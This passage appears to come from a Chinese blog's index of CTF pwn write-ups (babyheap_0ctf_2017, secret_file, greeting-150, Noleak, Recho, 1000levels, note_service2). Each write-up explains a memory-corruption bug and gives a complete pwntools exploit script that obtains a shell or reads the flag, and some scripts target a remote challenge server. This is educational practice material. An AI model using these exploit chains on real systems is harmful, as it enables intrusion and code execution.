分配一个堆块，其指针指向堆块4，进而我们就可以将main_arena地址读出。 其代码如下 #leack libc free(1) free(2) payload=p64(0)+p64(0)+p64(0)+p64(0x21)+p64(0)+p64(0)+p64(0)+p64(0x21)+'\\x80' fill(0,len(payload),payload) payload=p64(0)+p64(0)+p64(0)+p64(0x21) fill(3,len(payload),payload) alloc(0x10) #1 alloc(0x10) #2 payload=p64(0)+p64(0)+p64(0)+p64(0x91) fill(3,len(payload),payload) free(4) dump(2) 我们调试一下这个过程，来帮助大家更好的理解。 这是最初分配的堆块 free掉1和2后 若将箭头1处的地址修改为0x562e6e252080，虽然开启了地址随机化，但是地址最后三个字节不会改变，因此我们只需要溢出将0x20改为0x80，再将0x91修改为0x21就可以分配一个fastbin的地址为small bin的地址处。 可以看到，有两个指针指向同一个堆块。而这个堆块就是我们的small bin 我们再次利用堆溢出，将smallbin的大小恢复为0x91，然后free掉这个堆块。 free掉smallbin后，其fd和bk将会指向main_arena的地址，通过dump()就可以将main_arena给泄漏出来 利用vmmap我们可以获得libc的基址 如果Libc的基址为0x00007fd6ba201000，我们获得的main_arena地址为0x00007fd6ba5c5b78，main_arena相对libc基址的偏移量为0x00007fd6ba5c5b78-0x00007fd6ba201000=0x3c4b78。我们将泄露的main_arena减去这个偏移量就可以获得libc的基址。到这里我们已经成功地获得了libc_base。 ","date":"2020-04-09","objectID":"/babyheap-0ctf-2017/:3:1","tags":["pwn","wp"],"title":"babyheap_0ctf_2017","uri":"/babyheap-0ctf-2017/"},{"categories":["ctf"],"content":"利用Fast bin attack分配__malloc_hock_附件的堆块 这一步我们需要在__malloc_hock_附件找一个可以bypass fastbin size验证的堆块。 利用错位后，我们可以构造出一个0x7f大小的堆块，即用户数据为0x60大小。如此我们利用fastbin attack就可以分配一个在__malloc_hock附件的堆块。这里的利用我就不贴堆块变化了，和上面的堆块利用变化差不多。直接贴代码。 alloc(0x60) #6 alloc(0x10) #7 free(6) payload=p64(0)+p64(0)+p64(0)+p64(0x71)+p64(target) fill(5,len(payload),payload) alloc(0x60) #6 alloc(0x60) #8 ","date":"2020-04-09","objectID":"/babyheap-0ctf-2017/:3:2","tags":["pwn","wp"],"title":"babyheap_0ctf_2017","uri":"/babyheap-0ctf-2017/"},{"categories":["ctf"],"content":"修改__malloc_hock_的值为one_gadget 利用ona_gadget查找地址。 这里我利用的是第二个地址。然后用在__malloc_hock_周围分配的堆块，去修改__malloc_hock_的值。这里需要注意计算__malloc_hock_的地址相对于堆块地址的偏移。 payload='a'*0x13+p64(libc_base+0x4526a) fill(8,len(payload),payload) ","date":"2020-04-09","objectID":"/babyheap-0ctf-2017/:3:3","tags":["pwn","wp"],"title":"babyheap_0ctf_2017","uri":"/babyheap-0ctf-2017/"},{"categories":["ctf"],"content":"分配堆块，获得shell 最后，随便分配一个堆块，就可以执行one_gadget。 EXP #Author:Nop from pwn import * sh=process('./pwn2') def alloc(size): sh.recvuntil(':') sh.sendline('1') sh.recvuntil(':') sh.sendline(str(size)) def fill(index,size,content): sh.recvuntil(':') sh.sendline('2') sh.recvuntil(':') sh.sendline(str(index)) sh.recvuntil(':') sh.sendline(str(size)) sh.recvuntil(':') sh.send(content) def free(index): sh.recvuntil(':') sh.sendline('3') sh.recvuntil(':') sh.sendline(str(index)) def dump(index): sh.recvuntil(':') sh.sendline('4') sh.recvuntil(':') sh.sendline(str(index)) alloc(0x10) #0 alloc(0x10) #1 alloc(0x10) #2 alloc(0x10) #3 alloc(0x80) #4 alloc(0x10) #5 #leack libc free(1) free(2) payload=p64(0)+p64(0)+p64(0)+p64(0x21)+p64(0)+p64(0)+p64(0)+p64(0x21)+'\\x80' fill(0,len(payload),payload) payload=p64(0)+p64(0)+p64(0)+p64(0x21) fill(3,len(payload),payload) alloc(0x10) #1 alloc(0x10) #2 payload=p64(0)+p64(0)+p64(0)+p64(0x91) fill(3,len(payload),payload) free(4) dump(2) sh.recvuntil('Content: \\n') topchunk_two=sh.recvline().replace('\\n','') length=len(topchunk_two) topchunk=u64(topchunk_two[0:length/2]) main_arena=topchunk-0x58 target=main_arena-0x33 libc_base=topchunk-0x3c4b78 log.success('topchunk:'+hex(topchunk)) log.success('libc_base:'+hex(libc_base)) alloc(0x80) #4 alloc(0x60) #6 alloc(0x10) #7 free(6) payload=p64(0)+p64(0)+p64(0)+p64(0x71)+p64(target) fill(5,len(payload),payload) alloc(0x60) #6 alloc(0x60) #8 payload='a'*0x13+p64(libc_base+0x4526a) fill(8,len(payload),payload) alloc(0x10) sh.interactive() 收获 这道题应该算是堆里面比较简单的题目了，堆溢出的溢出字节是由用户自己控制的。所以堆利用的大多数技术都可以使用，但是要使用哪些技术，并且这些技术如何相互配合。这就是一个比较难的问题。通过这道题也确实对堆利用技术理解更深入了。是一道难得的好题。 ","date":"2020-04-09","objectID":"/babyheap-0ctf-2017/:3:4","tags":["pwn","wp"],"title":"babyheap_0ctf_2017","uri":"/babyheap-0ctf-2017/"},{"categories":["ctf"],"content":"参考 UAFIO ","date":"2020-04-09","objectID":"/babyheap-0ctf-2017/:3:5","tags":["pwn","wp"],"title":"babyheap_0ctf_2017","uri":"/babyheap-0ctf-2017/"},{"categories":["ctf"],"content":"涉及知识 SHA256 popen系统函数，执行命令 分析程序 ","date":"2020-03-29","objectID":"/secret-file/:0:0","tags":["pwn","wp"],"title":"secret_file","uri":"/secret-file/"},{"categories":["ctf"],"content":"保护机制 保护全开 ","date":"2020-03-29","objectID":"/secret-file/:1:0","tags":["pwn","wp"],"title":"secret_file","uri":"/secret-file/"},{"categories":["ctf"],"content":"漏洞分析 这道题的难点就在于程序逆向后，代码不是很容易看明白。 但是冷静下来慢慢的理解，还是能看明白的。程序就是一个hash计算，根据dest的0x100字节进行一个SHA256计算，将摘要结果储存在v18中，最后将v15和v18进行比较。比较成功就会执行popen(\u0026v14,‘r’)，进而可以执行ls，cat等命令。 getline可以读入任意字节的数据，strcpy将读入的数据复制到dest中，所以这里存在溢出。我们可以覆盖v14和v15的值。同时用于hash计算的值，我们也可以自己设定，因此漏洞利用思路就很清晰了。 利用payload=‘a’*0x100+‘ls;'.ljust(0x1b,’ ‘)+hashlib.sha256(‘a’*0x100).hexdigest()来显示当前目录下有哪些文件。 注意：由于时strcpy将数据复制到dest上的，而strcpy遇到\\x00将终止复制，所以payload里不应用\\x00来填写多余字符。这也是为什么ls后面需要加;,否则popen将会把ls和填充的字符当成一条命令，造成错误。 再利用payload=‘a’*0x100+‘cat flag.txt;'.ljust(0x1b,’ ‘)+hashlib.sha256(‘a’*0x100).hexdigest()来获取flag EXP from pwn import * from LibcSearcher import LibcSearcher import hashlib context.log_level='debug' #sh=process('./xctf') sh=remote('111.198.29.45',53262) #gdb.attach(sh) hash_resulet='02d7160d77e18c6447be80c2e355c7ed4388545271702c50253b0914c65ce5fe' payload='a'*0x100+'cat flag.txt;'.ljust(0x1b,' ')+hashlib.sha256('a'*0x100).hexdigest() sh.sendline(payload) sh.interactive() ","date":"2020-03-29","objectID":"/secret-file/:2:0","tags":["pwn","wp"],"title":"secret_file","uri":"/secret-file/"},{"categories":["ctf"],"content":"反思 动态调试的能力有待提升，遇到问题时，不能通过调试把它找出来。 strcpy遇到\\x00就会结束复制，在构造payload时，最开始是用\\x00来填充多余字符的，导致出错。 ","date":"2020-03-29","objectID":"/secret-file/:3:0","tags":["pwn","wp"],"title":"secret_file","uri":"/secret-file/"},{"categories":["ctf"],"content":"涉及知识 格式化漏洞 _fini_array修改 程序分析 ","date":"2020-03-28","objectID":"/greeting-150/:0:0","tags":["pwn","wp"],"title":"greeting-150","uri":"/greeting-150/"},{"categories":["ctf"],"content":"保护机制 保护开启了Canary和NX ","date":"2020-03-28","objectID":"/greeting-150/:1:0","tags":["pwn","wp"],"title":"greeting-150","uri":"/greeting-150/"},{"categories":["ctf"],"content":"漏洞分析 漏洞很明显，在箭头处存在字符串漏洞，我们可以实现任意地址修改。但是程序没有循环，我们在修改完一次后，程序就会结束。所以我们需要使程序重新从main处开始执行。 当main函数执行完毕后，会执行_fini_array中的函数，所以可以利用字符串漏洞将_fini_array中写入main入口地址，如此程序就可以再次进入main。那么当我们把strlen的got表修改为system的plt表后，只需要输入/bin/sh就可以获得shell EXP from pwn import * from LibcSearcher import LibcSearcher # context.log_level='debug' sh=process('./xctf') #sh=remote('111.198.29.45',34936) elf=ELF('./xctf') strlen_got=elf.got['strlen'] print hex(strlen_got) init_fini=0x08049934 #strlen_got ==\u003e system_plt payload='a'*2+p32(init_fini+2)+p32(strlen_got+2)+p32(strlen_got)+p32(init_fini) payload+='%2016c%12$hn%13$hn'+'%31884c%14$hn'+'%349c%15$hn' sh.sendlineafter('name...',payload) sh.sendline('/bin/sh') sh.interactive() ","date":"2020-03-28","objectID":"/greeting-150/:2:0","tags":["pwn","wp"],"title":"greeting-150","uri":"/greeting-150/"},{"categories":["ctf"],"content":"反思 最开始尝试修改strlen的plt表，程序一直存在异常，最后发现是plt表没有写权限。 EXP中是将strlen的got表写为system的plt表，但是如果写为system的got表则不成功。这里有一点疑惑，看来得把程序员的自我修养认真看一下。 ","date":"2020-03-28","objectID":"/greeting-150/:3:0","tags":["pwn","wp"],"title":"greeting-150","uri":"/greeting-150/"},{"categories":["ctf"],"content":"参考 CSDN ","date":"2020-03-28","objectID":"/greeting-150/:4:0","tags":["pwn","wp"],"title":"greeting-150","uri":"/greeting-150/"},{"categories":["ctf"],"content":"涉及知识 Unsorted bin attack Unlink 利用泄漏的Unsorted地址获得__malloc_hook 程序分析 ","date":"2020-03-27","objectID":"/noleak/:0:0","tags":["pwn","wp"],"title":"Noleak","uri":"/noleak/"},{"categories":["ctf"],"content":"保护机制 RELRO保护全开启，plt，got表等没有写权限，但是NX保护没有开启，可以自己写shellcode。 ","date":"2020-03-27","objectID":"/noleak/:1:0","tags":["pwn","wp"],"title":"Noleak","uri":"/noleak/"},{"categories":["ctf"],"content":"漏洞分析 在update函数中，程序没有对读入字节做限制，存在堆溢出。 在delete函数中，free后没有对指针清零。UAF，Double free，Unsorted攻击等都可以使用。 ","date":"2020-03-27","objectID":"/noleak/:2:0","tags":["pwn","wp"],"title":"Noleak","uri":"/noleak/"},{"categories":["ctf"],"content":"思路 由于程序RELRO全开启，无法泄漏libc地址，就如题目一样，No leak。但是可以利用Unsorted攻击，将Unsorted的地址attack到储存指针的变量上。Unsorted的地址低8位修改为\\x10后，刚好为__malloc_hook的地址。我们在将__malloc_hook的值修改为我们的shellcode。 __malloc_hook的工作原理和__free_hook类似。在默认情况下__malloc_hook值为null，当malloc函数调用时，会先判断__malloc_hook是否为空，如果不为空，就会执行__malloc_hook指向的函数 如何修改Unsorted的低8位呢？在这里有几种办法，可以使用Unlink attack，也可以使用fastbin attack。 EXP from pwn import * context.arch='amd64' context.os='linux' #sh=process('./timu') sh=remote('111.198.29.45',40228) elf=ELF('./timu') def create(size,data): sh.recvuntil(':') sh.sendline('1') sh.recvuntil(':') sh.sendline(str(size)) sh.recvuntil(':') sh.sendline(data) def delete(index): sh.recvuntil(':') sh.sendline('2') sh.recvuntil(':') sh.sendline(str(index)) def update(index,size,data): sh.recvuntil(':') sh.sendline('3') sh.recvuntil(':') sh.sendline(str(index)) sh.recvuntil(':') sh.sendline(str(size)) sh.recvuntil(':') sh.send(data) #create create(0x90,'aaa') #0 create(0x90,'bbb') #1 create(0x90,'ccc') #2 #unsorted attack delete(0) unsorted_addr=0x601050 payload='a'*8+p64(unsorted_addr) update(0,0x90,payload) create(0x90,'aaa') #3 #unlink attach #fake chunck aim=0x601048 payload='a'*8+p64(0x91)+p64(aim-0x18)+p64(aim-0x10)+'a'*0x70+p64(0x90)+p64(0xa0) update(1,0xa0,payload) delete(2) #eidit unsorted shell=0x601030 update(1,0xa0,asm(shellcraft.sh())+'\\x10') update(4,0x8,p64(shell)) sh.recvuntil(':') sh.sendline('1') sh.recvuntil(':') sh.sendline('2') sh.interactive() 反思 堆利用多种技术结合会碰撞出不一样的火花 Unsorted变量和__malloc_hook这样的变量储存的位置较近 ","date":"2020-03-27","objectID":"/noleak/:3:0","tags":["pwn","wp"],"title":"Noleak","uri":"/noleak/"},{"categories":["ctf"],"content":"参考 Unsorted + Fastbin ","date":"2020-03-27","objectID":"/noleak/:4:0","tags":["pwn","wp"],"title":"Noleak","uri":"/noleak/"},{"categories":["ctf"],"content":"涉及知识 pwntools终止输入 syscall系统调用open fd第一个文件为3，第二个为4 程序分析 ","date":"2020-03-27","objectID":"/recho/:0:0","tags":["pwn","wp"],"title":"Recho","uri":"/recho/"},{"categories":["ctf"],"content":"保护机制 开启NX和部分RELRO ","date":"2020-03-27","objectID":"/recho/:1:0","tags":["pwn","wp"],"title":"Recho","uri":"/recho/"},{"categories":["ctf"],"content":"漏洞分析 程序逻辑很简单，就是一个简单的栈溢出。v7是任意输入的一个整型变量，其决定了读入的数据值，所以可以读入任意长度的值。 但是程序是一个死循环，只有结束了read函数后，才会跳出。ctrl + d 可以结束read函数。pwntools的shutdown(‘send’)函数同样可以结束read函数，但是结束之后，就不能再输入payload，故我们需要一次性达到目的。 在gdb中，给alarm打下断点，可以发现在alarm+5处有syscall系统调用可以使用。再结合flag字符串，我们很容易想到用open函数将flag文件中的值给读出来。 获得fd后，用write函数将fd中的值写入bss段中，这里选用.bss+0x500。存入.bss后，我们用printf函数或则read函数，将.bss中的内容给显示在屏幕上。 需要使用的gadget用ROPgadget来获得。 EXP from pwn import * from LibcSearcher import LibcSearcher #sh=process('./xctf') sh=remote('111.198.29.45',34291) elf=ELF('./xctf') #one gadget6 pop_rdi_ret=0x4008a3 pop_rsi_pop_r15_ret=0x4008a1 pop_rdx_ret=0x4006fe pop_rax_ret=0x4006fc add_rdi_ret=0x40070d flag=0x601058 alarm_got=elf.got['alarm'] alarm=elf.plt['alarm'] bss=0x601090 read=elf.plt['read'] printf=elf.plt['printf'] #make payload payload='a'*0x38 #alarm_got=syscall payload+=p64(pop_rdi_ret)+p64(alarm_got) payload+=p64(pop_rax_ret)+p64(5) payload+=p64(add_rdi_ret) #open(flag,READONLY) payload+=p64(pop_rdi_ret)+p64(flag) payload+=p64(pop_rax_ret)+p64(2) payload+=p64(pop_rdx_ret)+p64(0) payload+=p64(pop_rsi_pop_r15_ret)+p64(0)+p64(0) payload+=p64(alarm) #read(flag,bss,50) payload+=p64(pop_rdi_ret)+p64(3) payload+=p64(pop_rsi_pop_r15_ret)+p64(bss+0x500)+p64(0) payload+=p64(pop_rdx_ret)+p64(0x30) payload+=p64(read) #printf(bss) payload+=p64(pop_rdi_ret)+p64(bss+0x500) payload+=p64(printf) sh.recvuntil('server!\\n') sh.sendline(str(0x200)) payload=payload.ljust(0x200,'\\x00') sh.send(payload) sh.recv() sh.shutdown('send') sh.interactive() 反思 没想到syscall可以在alarm中寻找，以及将alarm_got值加5的骚操作。这道题应该算把ROP技术发挥的淋漓尽致，fd的值第一次是3，第二次是4，依次递增是一个知识盲点。 ","date":"2020-03-27","objectID":"/recho/:2:0","tags":["pwn","wp"],"title":"Recho","uri":"/recho/"},{"categories":["ctf"],"content":"参考 SCDN ","date":"2020-03-27","objectID":"/recho/:3:0","tags":["pwn","wp"],"title":"Recho","uri":"/recho/"},{"categories":["ctf"],"content":"涉及知识 栈溢出 绕过PIE保护 vsyscall的利用 漏洞分析 ","date":"2020-03-26","objectID":"/1000levels/:0:0","tags":["pwn","wp"],"title":"1000levels","uri":"/1000levels/"},{"categories":["ctf"],"content":"保护机制 此题难点在于开启了PIE保护，影响程序的加载基址，地址随机化。 ","date":"2020-03-26","objectID":"/1000levels/:1:0","tags":["pwn","wp"],"title":"1000levels","uri":"/1000levels/"},{"categories":["ctf"],"content":"IDA分析 hint函数中，不管if是否为真，system的地址都被储存在rbp-0x110处，这是非常有用的信息，是解这道题的关键 在go函数中，如果第一次输入值小于等于零，将不会对rbp-0x110处的地址赋值，而如果在运行go函数前，运行了hint函数，rbp-0x110处的值将是system的地址。这是因为hint函数和go函数都是由同一个函数调用，栈信息相同。 第二次输入的值，将会和rbp-0x110处的值相加，利用这一点，我们可以修改system的地址为one gadget的地址。（在这里system无法使用。system需要参数，而PIE保护开启，无法利用ROP） 选用第一个onegadget：0x4526a，第二个输入的值为两个函数偏移量的差值。 one_gadget的地址必定大于99，所以将进行100次游戏，在这里我们先进行99次游戏，在最后一次利用栈溢出，来执行我们的one gadget。但是这里还有一个问题，onegadget离返回地址处还有0x18个字节，我们需要在这几个位置注入影响较小的命令地址，来滑动到onedget处。PIE开启，函数地址都是随机的，我们就没有办法利用程序中现有的片段。 那应该怎么办？ 虽然程序地址是随机的，但是vsyscall的地址是固定的。 vsyscall是一种古老的加快系统调用的机制。现代的Windows/*Unix操作系统都采用了分级保护的方式，内核代码位于R0，用户代码位于R3。许多硬件和内核等的操作都被封装成内核函数，提供一个接口，给用户态调用，这个调用接口就是我们熟知的int 0x80/syscall+调用号。当我们每次调用接口时，为了保障数据的隔离，都会把当前的上下文（寄存器状态）保存好，然后切换到内核态运行内核函数，最后将内核函数的返回结果保存在寄存器和内存中，再恢复上下文，切换到用户态。这一过程是非常消耗性能和时间的，对于一些调用频繁的内核函数，反复折腾，开销就会变成一个累赘。因此系统就把几个常用的无参内核调用从内核中映射到用户空间，这就是syscall。 利用gdb把syscall||dump出来加载到IDA中观察 seg000:FFFFFFFFFF600000 ; Segment type: Pure code seg000:FFFFFFFFFF600000 seg000 segment byte public 'CODE' use64 seg000:FFFFFFFFFF600000 assume cs:seg000 seg000:FFFFFFFFFF600000 ;org 0FFFFFFFFFF600000h seg000:FFFFFFFFFF600000 assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing seg000:FFFFFFFFFF600000 mov rax, 60h seg000:FFFFFFFFFF600007 syscall ; $! seg000:FFFFFFFFFF600009 retn seg000:FFFFFFFFFF600009 ; --------------------------------------------------------------------------- seg000:FFFFFFFFFF60000A align 400h seg000:FFFFFFFFFF600400 mov rax, 0C9h seg000:FFFFFFFFFF600407 syscall ; $! seg000:FFFFFFFFFF600409 retn seg000:FFFFFFFFFF600409 ; --------------------------------------------------------------------------- seg000:FFFFFFFFFF60040A align 400h seg000:FFFFFFFFFF600800 mov rax, 135h seg000:FFFFFFFFFF600807 syscall ; $! seg000:FFFFFFFFFF600809 retn seg000:FFFFFFFFFF600809 ; --------------------------------------------------------------------------- seg000:FFFFFFFFFF60080A align 800h seg000:FFFFFFFFFF60080A seg000 ends 这里还有一点需要注意，我们不能将返回地址设置为0xFFFFFFFFFF600007，而是设置为0xFFFFFFFFFF600000。这是因为syscall会对其进行检测，如果不是函数的开头将会报错。 EXP from pwn import* elf=ELF('./libc.so') sh=process('./100levels') #sh=remote('111.198.29.45',58163) target_off=0x4526a system_off=elf.symbols['system'] sh.recvuntil('Choice:\\n') sh.sendline('2') sh.recvuntil('Choice:\\n') sh.sendline('1') sh.recvuntil('How many levels?\\n') sh.sendline('0') sh.recvuntil('Any more?\\n') sh.sendline(str(target_off-system_off)) for i in range(99): sh.recvuntil('Question: ') parse=sh.recvuntil('=').replace('=','') ans=eval(parse) sh.sendline(str(ans)) payload='a'*56+p64(0xffffffffff600800)*3 sh.send(payload) sh.interactive() ","date":"2020-03-26","objectID":"/1000levels/:2:0","tags":["pwn","wp"],"title":"1000levels","uri":"/1000levels/"},{"categories":["ctf"],"content":"反思 注意sendline发送后，read函数会读入换行符\\xa ","date":"2020-03-26","objectID":"/1000levels/:3:0","tags":["pwn","wp"],"title":"1000levels","uri":"/1000levels/"},{"categories":["ctf"],"content":"参考 PIE保护绕过 vsyscall ","date":"2020-03-26","objectID":"/1000levels/:4:0","tags":["pwn","wp"],"title":"1000levels","uri":"/1000levels/"},{"categories":["ctf"],"content":"涉及知识 堆shellcode执行 shellcode编写 程序分析 ","date":"2020-03-18","objectID":"/note-service2/:1:0","tags":["pwn","wp"],"title":"note_service2","uri":"/note-service2/"},{"categories":["ctf"],"content":"保护机制 64位程序，NX保护未开启，堆栈可以代码执行。 ","date":"2020-03-18","objectID":"/note-service2/:2:0","tags":["pwn","wp"],"title":"note_service2","uri":"/note-service2/"},{"categories":["ctf"],"content":"程序漏洞分析 IDA打开程序，功能十分简单，只有添加和删除两个功能。 添加函数中，由于没有对index做出限制，所以存在修改任意地址内容漏洞。添加的内容，由malloc分配，最大8个字节，并且最后一个字节会被清零。由于堆段有代码执行权限，我们可以在堆段中构造我们的shellcode，再利用任意地址修改，将一个got函数的地址修改为我们shellcode所在地址。 但是由于每次malloc只能分配8个字节，所以编写shellcode时，我们可以利用jmp来跳转。 在IDA中观察发现，jmp对应\\xEB。从B8跳转到D1之间有0x19，但在十六进制代码中，是0x17，所以我们可以知道，在jmp的跳转数值中，其跳转的值是目标地址减原始地址再减2。 我们读入的字节是7个字节(第8个字节程序自动补0)，如果将jmp放在最后两个字节，那么可以计算得到，其需要跳转的值为0x19。 我们的shellcode利用syscall来使用，其需要的步骤为(64位)： mov rdi,xxx（/bin/sh的地址） mov rsi,0 mov rdx,0 mov eax,0x3b 0x38为64位程序execv调用号 syscall 对于第一个条件，如果我们将free修改为第二条指令的地址，第一个malloc填的值是/bin/sh，当我们free掉第一个时，就会将该堆的地址作为参数传入rdi。 EXP from pwn import * context.arch='amd64' sh=process('./xctf') def add(index,content): sh.sendlineafter('your choice\u003e\u003e ','1') sh.sendlineafter('index:',str(index)) sh.sendlineafter('size:','8') sh.sendlineafter('content',content) def delt(index): sh.sendlineafter('your choice\u003e\u003e ','4') sh.sendlineafter('index:',str(index)) code=[asm('xor rsi,rsi'),asm('xor rdx,rdx'),asm('mov eax,0x3B'),asm('syscall')] free_index=(0x202018-0x2020a0)/8 #for c in code: # print len(c) add(0,'/bin/sh') add(free_index,code[0]+'\\x90\\x90\\xEB\\x19') add(1,code[1]+'\\x90\\x90\\xEB\\x19') add(2,code[2]+'\\xEB\\x19') add(3,code[3]) delt(0) sh.interactive() ","date":"2020-03-18","objectID":"/note-service2/:3:0","tags":["pwn","wp"],"title":"note_service2","uri":"/note-service2/"},{"categories":["ctf"],"content":"反思 由于可供编写shellcode的空间有限，在编写时可以将一些占用字节长的代码替换成相同效果但占用少的代码。如:将mov rsi,0 替换为 xor rsi,rsi。rax替换成eax 堆中如果想改变程序的执行流程，一般都是通过修改函数的got表来实现。比如这道题，将free修改为堆中地址，进而在调用free函数时，把控制流劫持到堆栈中 ","date":"2020-03-18","objectID":"/note-service2/:4:0","tags":["pwn","wp"],"title":"note_service2","uri":"/note-service2/"},{"categories":["ctf"],"content":"参考 CSDN ","date":"2020-03-18","objectID":"/note-service2/:4:1","tags":["pwn","wp"],"title":"note_service2","uri":"/note-service2/"}]